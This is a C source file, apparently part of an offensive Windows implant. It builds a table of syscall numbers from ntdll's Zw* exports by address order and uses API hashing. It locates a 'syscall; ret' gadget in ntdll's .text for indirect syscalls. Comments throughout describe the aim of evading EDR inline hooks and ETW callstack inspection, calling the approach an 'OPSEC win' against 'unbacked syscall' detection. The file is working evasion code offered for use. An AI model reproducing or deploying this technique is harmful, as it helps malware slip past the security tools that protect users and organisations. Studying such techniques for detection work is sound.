#include "Syscalls.h"
#include "ApiHashing.h"
#include "Common.h"

#define MAX_SYSCALLS 500

typedef struct _SYSCALL_ENTRY {
    DWORD Hash;
    DWORD RVA;
    DWORD SSN;
} SYSCALL_ENTRY, *PSYSCALL_ENTRY;

// Global array to hold parsed syscalls
static SYSCALL_ENTRY g_Syscalls[MAX_SYSCALLS];
static DWORD g_SyscallCount = 0;
static PVOID g_CleanTrampoline = NULL;

// Helper to sort syscall entries by RVA
static void SortSyscalls() {
    for (DWORD i = 0; i < g_SyscallCount - 1; i++) {
        for (DWORD j = 0; j < g_SyscallCount - i - 1; j++) {
            if (g_Syscalls[j].RVA > g_Syscalls[j + 1].RVA) {
                SYSCALL_ENTRY temp = g_Syscalls[j];
                g_Syscalls[j] = g_Syscalls[j + 1];
                g_Syscalls[j + 1] = temp;
            }
        }
    }
    // Assign SSNs sequentially based on sorted RVA
    for (DWORD i = 0; i < g_SyscallCount; i++) {
        g_Syscalls[i].SSN = i;
    }
}

// Parse a given ntdll image and extract RVAs of all Zw/Nt* functions
static BOOL ParseNtdllSyscalls(PBYTE pBase) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    IMAGE_DATA_DIRECTORY exportDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir.Size == 0 || exportDir.VirtualAddress == 0) return FALSE;

    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pBase + exportDir.VirtualAddress);

    PDWORD pAddrOfFunctions = (PDWORD)(pBase + pExport->AddressOfFunctions);
    PDWORD pAddrOfNames = (PDWORD)(pBase + pExport->AddressOfNames);
    PWORD pAddrOfOrdinals = (PWORD)(pBase + pExport->AddressOfNameOrdinals);

    g_SyscallCount = 0;

    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        char* pFuncName = (char*)(pBase + pAddrOfNames[i]);

        // Only interested in Zw*(Nt) functions
        if (pFuncName[0] == 'Z' && pFuncName[1] == 'w') {
            DWORD dwHash = Djb2HashA(pFuncName);
            DWORD dwRVA = pAddrOfFunctions[pAddrOfOrdinals[i]];

            if (g_SyscallCount < MAX_SYSCALLS) {
                g_Syscalls[g_SyscallCount].Hash = dwHash;
                g_Syscalls[g_SyscallCount].RVA = dwRVA;
                g_Syscalls[g_SyscallCount].SSN = 0; // Will be assigned later
                g_SyscallCount++;
            }
        }
    }
    return TRUE;
}

/* Scans .text for `syscall; ret` (0F 05 C3).
 *
 * The 3-byte sequence is the standard tail of every Nt* stub.  EDR userland
 * inline hooks target the *entry point* of exported Nt* functions (first
 * 5-15 bytes), never the syscall instruction at the end — hooking the middle
 * of a stub would break its semantics.  The bytes at any matching site
 * inside process ntdll's .text are therefore unmodified, identical to what
 * a clean \KnownDlls\ntdll.dll mapping would yield, and (crucially) live in
 * MEM_IMAGE memory backed by ntdll.dll on disk.
 *
 * That last property is the OPSEC win: when an ETW kernel callstack walker
 * (or any RtlVirtualUnwind-based EDR sensor) starts from the syscall RIP it
 * lands inside an image-backed module rather than MEM_PRIVATE — no
 * "unbacked syscall" IOC.  An earlier revision copied the 3 bytes to a
 * private RX buffer to avoid leaving a secondary ntdll mapping in the
 * process; that traded a low-signal IOC for a much higher-signal one. */
static PVOID FindCleanTrampoline(PBYTE pBase) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);

    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (custom_strcmp((char*)pSection[i].Name, ".text") == 0) {
            PBYTE pText = pBase + pSection[i].VirtualAddress;
            DWORD dwSize = pSection[i].Misc.VirtualSize;

            for (DWORD j = 0; j < dwSize - 2; j++) {
                if (pText[j] == 0x0F && pText[j + 1] == 0x05 && pText[j + 2] == 0xC3) {
                    return (PVOID)(pText + j);
                }
            }
        }
    }
    return NULL;
}

BOOL Syscalls_Init(void) {
    HMODULE hNtdll = GetModuleHandleH(g_Hash_ntdll);
    if (!hNtdll) return FALSE;

    /* 1. Parse process ntdll exports — SYSCALL_ENTRY[hash, RVA] table. */
    if (!ParseNtdllSyscalls((PBYTE)hNtdll)) return FALSE;

    /* 2. Sort by RVA, assign sequential SSNs (FreshyCalls technique).
     *    Works on hooked ntdll because EDR hooks don't reorder exports. */
    SortSyscalls();

    /* 3. Locate `syscall; ret` in process ntdll's .text — see the header
     *    note on FindCleanTrampoline for why this MEM_IMAGE site beats a
     *    KnownDlls + MEM_PRIVATE copy. */
    g_CleanTrampoline = FindCleanTrampoline((PBYTE)hNtdll);
    if (!g_CleanTrampoline) return FALSE;

    return TRUE;
}

BOOL Syscalls_GetParamsByHash(DWORD dwApiHash, PDWORD pdwSsn, PVOID* ppTrampoline) {
    if (!pdwSsn || !ppTrampoline || !g_CleanTrampoline) return FALSE;

    // Use the Zw* equivalent hash for Nt* functions.
    // Usually Nt and Zw resolve to the same SSN and logic, but this array is built using Zw names.
    // In this StubNtApi mappings, if we use HASH_Nt*, we should search for HASH_Zw*
    // A simple trick: if we didn't find the hash, we can search by replacing 'N'/'t' with 'Z'/'w' before hashing.
    // But since ApiHashing hashes the exact string, the caller must pass the HASH of the Zw function or we check both.
    for (DWORD i = 0; i < g_SyscallCount; i++) {
        if (g_Syscalls[i].Hash == dwApiHash) {
            *pdwSsn = g_Syscalls[i].SSN;
            *ppTrampoline = g_CleanTrampoline;
            return TRUE;
        }
    }
    return FALSE;
}
